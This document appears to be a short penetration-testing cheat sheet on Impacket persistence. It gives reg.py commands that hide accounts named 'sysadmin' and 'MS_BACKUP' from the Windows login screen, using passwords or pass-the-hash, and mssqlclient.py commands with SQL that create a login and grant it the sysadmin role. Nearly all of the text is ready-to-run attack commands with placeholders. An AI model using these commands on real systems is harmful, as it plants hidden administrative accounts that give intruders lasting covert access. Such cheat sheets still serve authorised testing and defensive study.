# Impacket

## 01 - MSRPC Port

Makes the user account invisible from the Windows Login screen

```
$ reg.py [<domain>/]<username>:"<password>"@<IP> add -keyName "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" -v sysadmin -vt REG_DWORD -vd 0

$ reg.py [<domain>/]<username>@<IP> -hashes :<nt_hash> add -keyName "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" -v sysadmin -vt REG_DWORD -vd 0
```

Persistence method to add user account

```
$ reg.py [<domain>/]<username>:"<password>"@<IP> add -keyName "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -v MS_BACKUP -vt REG_DWORD -vd 0

$ reg.py [<domain>/]<username>@<IP> -hashes :<nt_hash> add -keyName "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -v MS_BACKUP -vt REG_DWORD -vd 0
```

## 02 - MSSQL Port

TODO: Fill this info

```
$ mssqlclient.py -port 1433 -windows-auth <domain>/<username>:<password>@<IP>

$ mssqlclient.py -port 1433 -windows-auth <domain>/<username>@<IP> -hashes :<nt_hash>

CREATE LOGIN <username> WITH PASSWORD = '<password>';
sp_addsrvrolemember '<username>', 'sysadmin';
go
```

---
## References

### Hacktricks

- [Hacktricks: Pentesting MSSQL Microsoft SQL Server](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server.html)